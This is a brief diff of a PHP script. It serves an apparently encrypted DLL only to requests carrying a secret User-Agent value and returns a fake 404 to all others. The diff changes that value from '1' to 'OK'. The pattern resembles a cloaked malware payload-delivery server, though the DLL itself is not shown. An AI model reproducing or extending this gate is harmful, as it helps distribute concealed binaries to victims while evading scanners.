@@ -13,7 +13,7 @@ function sendFile($filename) {
   readfile($filename);
 }
 
-if ($_SERVER['HTTP_USER_AGENT'] == "1") {
+if ($_SERVER['HTTP_USER_AGENT'] == "OK") {
   sendFile("./get/fuckingdllENCR.dll");
 } else {
   header("HTTP/1.0 404 Not Found");
